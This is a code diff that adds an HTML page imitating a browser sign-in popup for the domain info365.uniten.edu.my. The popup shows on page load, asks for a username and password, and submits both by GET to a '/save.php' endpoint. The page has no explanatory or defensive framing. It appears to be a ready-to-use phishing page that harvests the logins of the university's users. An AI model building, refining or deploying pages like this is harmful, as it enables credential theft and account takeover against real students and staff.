@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>info365.uniten.edu.my</title>
+  <style>
+    body {
+      background-color: #6b6b6b;
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    /* Dark overlay */
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(80,80,80,0.85);
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding-top: 60px;
+      z-index: 999;
+    }
+
+    .modal {
+      background-color: #ffffff;
+      padding: 40px 40px 30px 40px;
+      border-radius: 8px;
+      width: 380px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+    }
+
+    .modal h2 {
+      margin: 0 0 6px 0;
+      font-size: 22px;
+      font-weight: bold;
+      color: #000;
+    }
+
+    .modal p {
+      margin: 0 0 28px 0;
+      font-size: 13px;
+      color: #444;
+    }
+
+    .form-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+
+    .form-group label {
+      width: 90px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .form-group input {
+      flex: 1;
+      padding: 8px 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: flex-end;
+      gap: 12px;
+      margin-top: 28px;
+    }
+
+    .btn-signin {
+      background-color: #1a56db;
+      color: white;
+      border: none;
+      padding: 10px 28px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .btn-cancel {
+      background-color: #e8eaf0;
+      color: #333;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .btn-signin:hover { background-color: #1344b8; }
+    .btn-cancel:hover { background-color: #d0d3de; }
+  </style>
+</head>
+<body>
+
+  <!-- Popup appears on page load -->
+  <div class="overlay" id="popup">
+    <div class="modal">
+      <h2>Sign in</h2>
+      <p>https://info365.uniten.edu.my</p>
+
+      <form action="/save.php" method="GET">
+        <div class="form-group">
+          <label for="user">Username</label>
+          <input type="text" id="user" name="user" autofocus>
+        </div>
+        <div class="form-group">
+          <label for="pass">Password</label>
+          <input type="password" id="pass" name="pass">
+        </div>
+        <div class="buttons">
+          <button type="submit" class="btn-signin">Sign in</button>
+          <button type="button" class="btn-cancel" onclick="document.getElementById('popup').style.display='none'">Cancel</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+</body>
+</html>
